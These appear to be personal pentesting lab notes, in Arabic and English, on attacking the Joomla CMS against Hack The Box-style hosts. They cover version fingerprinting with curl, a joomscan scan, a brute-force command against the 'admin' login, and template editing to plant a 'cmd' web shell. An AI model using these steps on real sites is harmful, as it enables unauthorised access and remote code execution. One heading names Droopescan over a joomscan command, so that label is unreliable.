#### 1. ما هو Joomla؟

هو نظام إدارة محتوى (CMS) مجاني ومفتوح المصدر (مثل WordPress)، مبني بلغة PHP وقواعد بيانات MySQL. يمثل نسبة كبيرة من المواقع على الإنترنت (حوالي 3.5% من سوق الـ CMS).

#### 2. الاستكشاف والبصمة (Discovery/Footprinting)

الهدف هنا هو التأكد من أن الموقع يعمل بـ Joomla ومعرفة إصداره.

- **التحقق من الكود المصدري (Source Code):**
    
    - عادة ما نجد وسم `meta name="generator"` يحتوي على كلمة Joomla.
        
- **ملف `robots.txt`:**
    
    - هيكل الملف مميز جداً في جوملا، حيث يحتوي على مسارات مثل `/administrator/` و `/components/` و `/modules/`. وجود هذه المسارات يؤكد استخدام جوملا.
        
- **ملف `README.txt`:**
    
    - إذا نسى المطور حذفه، يمكن قراءته لمعرفة الإصدار الرئيسي (مثل 3.x).
        
- **ملفات XML الخاصة بالنظام:**
    
    - هناك ملفات تكوين (Manifest files) تكشف الإصدار بدقة، أهمها:
        
        - `administrator/manifests/files/joomla.xml` (يعطيك الإصدار الدقيق).
            
        - `plugins/system/cache/cache.xml` (يعطيك إصدار تقريبي).


# Joomla Pentesting Cheat Sheet

### Check README.txt
Often reveals the major version number.
```bash
curl -s http://dev.inlanefreight.local/README.txt | head -n 5
```

### Check Manifest File (Most Accurate)
Extracts exact version from `joomla.xml`.
```bash
curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -
```

### Check Cache Plugin XML
Can give an approximate version if the manifest is hidden.
```bash
curl -s http://dev.inlanefreight.local/plugins/system/cache/cache.xml
```

## 3. Automated Enumeration Tools

### Droopescan
A plugin-based scanner for CMS (Drupal, SilverStripe, WordPress, Joomla).

**Run Scan:**
Scans the target for version info and interesting URLs.
```bash
joomscan -u http://dev.inlanefreight.local/
```
## 4. Brute Forcing Admin Panel
Brute force the default `admin` account using a python script.

**Command:**
Uses a wordlist to crack the 'admin' password.
```bash
sudo python3 /mnt/j/shared/HTB/CommonWeb/jommla/joomla-bruteforce/joomla-brute.py -u http://app.inlanefreight.local -w /usr/share/wordlists/metasploit/http_default_pass.txt -usr admin
```

## 5. Key Files & Directories
| File/Path                                   | Description                                                          |
| ------------------------------------------- | -------------------------------------------------------------------- |
| `/robots.txt`                               | Shows `Disallow` rules specific to Joomla (e.g., `/administrator/`). |
| `/administrator/`                           | Default login panel.                                                 |
| `/administrator/manifests/files/joomla.xml` | Contains precise version number.                                     |
| `/media/system/js/`                         | JavaScript files that might leak version info.                       |

# Gaining RCE 

- after loged in got to `Extensions` -> `Templates` -> `Templates`
- then choose Beez3 or porostar or what ever is there and edit any page 
- i edited error.php 
- `http://dev.inlanefreight.local/templates/beez3/error.php?cmd=ls`
- 